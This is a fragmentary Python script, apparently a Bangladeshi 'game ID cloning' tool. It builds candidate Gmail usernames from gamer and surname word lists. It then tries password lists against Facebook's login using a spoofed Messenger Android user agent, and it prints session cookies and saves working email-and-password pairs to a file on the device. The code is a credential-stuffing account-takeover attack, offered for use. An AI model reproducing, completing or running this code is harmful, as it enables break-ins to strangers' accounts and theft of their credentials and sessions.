...
def mail(emad, limit):
    while True:
        ...
        subDomain1m=["gamer","ff","fflover","yt","official","boss","gaming","Gaming","Gamer","FF","FFlover","ASIFlover","YT","999","king","streamer","ffking","Khan","Ahamed","Chowdhury","Roy","Talukdahar","Haque","Shaikh","Vai","Hossain","Hasan","Islam","xxx"]
        ...
        subDomain1f=["Queen","queen","gaming","streamer","FF","ff","yt","YT","ffgirl","ffqueen","ASIFlover","ffyt","gamer","islam","Jahan","Moni","Chowdhury","Khan","Roy","Ahamed"]
...
def main():
    ...
    print(Panel.fit("[bold green]Developer     —>>     SHADIN ARMY"))
    print("")
    print(meth)
    ...
    os.system('clear')
    print(Panel.fit(logo, subtitle=">[reverse violet]BD GAME ID CLONEING TOOL[/reverse violet]<"))
    print(Panel.fit("[bold green]Developer     —>>     ASIF"))
    print('')
    ...
    os.system('clear')
    print(Panel.fit(logo, subtitle=">[reverse violet]BD GAME ID CLONEING TOOL[/reverse violet]<"))
    print(Panel.fit("[bold green]Developer     —>>     SHADIN"))
...
def file_subb(Gmail,psslist):
    ...
    try:
        for ps in psslist:
            ASIF="Dalvik/2.1.0 (Linux; U; Android 10; moto e Build/QPGS30.82-135-16) [FBAN/Orca-Android;FBAV/342.1.0.14.119;FBPN/com.facebook.orca;FBLC/en_US;FBBV/339015010;FBCR/Verizon ;FBMF/motorola;FBBD/motorola;FBDV/moto e;FBSV/10;FBCA/armeabi-v7a:armeabi;FBDM/{density=1.75,width=720,height=1422};FB_FW/1;] FBBK/1"
           ...
           'Content-Type': 'application/x-www-form-urlencoded',
            ...
            if "session_key" in q:
                ...
                if "Alive" == live_ck(cid):
                    print(f"\r\r[reverse white][ASIF][/reverse white] {cid} | {ps}   \n[🎮][green1]{coki} \n")
                    open("/sdcard/ASIF.txt","a").write(Gmail+"|"+ps+"\n")
                    oks.append(Gmail)
                    break
                else:pass
                ...
                if "Alive" == live_ck(cid):
                    print(f"\r\r[reverse white][ASIF][/reverse white] {cid} | {ps}   \n[🎮][green1]{coki} \n")
                    open("/sdcard/ASIF.txt.txt","a").write(Gmail+"|"+ps+"\n")
                    oks.append(Gmail)
                    break
                else:pass
            else:
